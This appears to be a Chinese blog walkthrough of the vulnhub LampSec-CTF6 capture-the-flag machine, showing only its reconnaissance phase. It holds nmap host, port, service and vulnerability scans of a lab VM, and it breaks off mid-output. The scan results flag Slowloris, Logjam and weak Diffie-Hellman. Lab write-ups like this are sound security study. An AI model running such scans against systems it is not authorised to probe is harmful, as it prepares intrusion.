<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  LampSec-CTF6 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF6</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:29:19.562Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:40.995Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">14.3k</div></span><br><span>Read Time: <div class="control">85 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/a12e8f918e3acbe34456729a5f6bb2ca34144840.jpg'><img src="/pic/a12e8f918e3acbe34456729a5f6bb2ca34144840.jpg" alt="a12e8f918e3acbe34456729a5f6bb2ca34144840"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>主机发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00020s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.2<br>Host is up (0.00023s latency).<br>MAC Address: 00:50:56:EC:CE:9E (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.140<br>Host is up (0.00046s latency).<br>MAC Address: 00:0C:29:5C:75:70 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.254<br>Host is up (0.00021s latency).<br>MAC Address: 00:50:56:FE:21:A5 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.132<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 4.06 seconds<br></code></pre></td></tr></table></figure>
<p>端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.140<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:03 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.140<br>Host is up (0.0026s latency).<br>Not shown: 65525 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>110/tcp  open  pop3<br>111/tcp  open  rpcbind<br>143/tcp  open  imap<br>443/tcp  open  https<br>624/tcp  open  cryptoadmin<br>993/tcp  open  imaps<br>995/tcp  open  pop3s<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:5C:75:70 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.68 seconds<br></code></pre></td></tr></table></figure>
<p>UDP端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.140<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:06 CST<br>Warning: 192.168.56.140 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan<br>UDP Scan Timing: About 52.44% <span class="hljs-keyword">done</span>; ETC: 11:08 (0:00:34 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.140<br>Host is up (0.0026s latency).<br>Not shown: 65453 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)<br>PORT    STATE SERVICE<br>111/udp open  rpcbind<br>MAC Address: 00:0C:29:5C:75:70 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 72.95 seconds<br></code></pre></td></tr></table></figure>
<p>TCP扫描，服务识别，OS识别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nmap -sT -sV -O -p22,80,110,111,143,443,624,993,995,3306 192.168.56.140<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.140<br>Host is up (0.00049s latency).<br><br>PORT     STATE SERVICE  VERSION<br>22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)<br>80/tcp   open  http     Apache httpd 2.2.3 ((CentOS))<br>110/tcp  open  pop3     Dovecot pop3d<br>111/tcp  open  rpcbind  2 (RPC <span class="hljs-comment">#100000)</span><br>143/tcp  open  imap     Dovecot imapd<br>443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))<br>624/tcp  open  status   1 (RPC <span class="hljs-comment">#100024)</span><br>993/tcp  open  ssl/imap Dovecot imapd<br>995/tcp  open  ssl/pop3 Dovecot pop3d<br>3306/tcp open  mysql    MySQL 5.0.45<br>MAC Address: 00:0C:29:5C:75:70 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6<br>OS details: Linux 2.6.9 - 2.6.30<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.60 seconds<br></code></pre></td></tr></table></figure>
<p>可用信息很多。反正还是先从80看起吧。</p>
<p>漏洞扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.140                                      <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.140<br>Host is up (0.0028s latency).<br>Not shown: 991 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>| http-enum: <br>|   /mail/: Mail folder<br>|   /logs/: Logs (401 Authorization Required)<br>|   /phpmyadmin/: phpMyAdmin<br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /docs/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /files/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /icons/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /inc/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /lib/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /manual/: Potentially interesting folder<br>|   /sql/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|_  /templates/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.140:80/?action=login</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: ?action=login</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.140:80/mail/</span><br><span class="hljs-string">|     Form id: rcmlogintz</span><br><span class="hljs-string">|_    Form action: ./</span><br><span class="hljs-string">|_http-trace: TRACE is enabled</span><br><span class="hljs-string">110/tcp  open  pop3</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="hljs-string">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="hljs-string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="hljs-string">|       which could completely compromise the confidentiality and integrity</span><br><span class="hljs-string">|       of any data exchanged over the resulting session.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       ANONYMOUS DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 512</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 512</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="hljs-string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="hljs-string">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="hljs-string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="hljs-string">|       to downgrade the security of a TLS session to 512-bit export-grade</span><br><span class="hljs-string">|       cryptography, which is significantly weaker, allowing the attacker</span><br><span class="hljs-string">|       to more easily break the encryption and monitor or tamper with</span><br><span class="hljs-string">|       the encrypted stream.</span><br><span class="hljs-string">|     Disclosure date: 2015-5-19</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       EXPORT-GRADE DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 512</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 512</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://weakdh.org</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/74733</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: 